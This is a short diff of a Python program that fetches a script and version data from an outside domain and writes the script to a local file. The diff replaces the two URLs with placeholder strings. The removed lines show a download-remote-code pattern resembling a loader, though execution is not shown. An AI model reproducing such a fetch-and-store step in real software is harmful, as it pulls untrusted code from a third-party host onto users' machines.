@@ -68,7 +68,7 @@ def main():
         elif check_internet_connection():
             # Fetch the script from the link if old_data.txt doesn't exist or is empty
             try:
-                response = requests.get("http://cdn.load-dev.xyz/zephyr/main.py")
+                response = requests.get("zephyr_main_code")
                 script = response.content.decode("utf-8")
 
                 # Write the script content to old_data.txt
@@ -120,7 +120,7 @@ def main():
             
 def get_latest_version():
     try:
-        response = requests.get("http://cdn.load-dev.xyz/zephyr/data.json")
+        response = requests.get("data_script")
         data = response.json()
         return data.get("latest_version")
     except Exception as e:
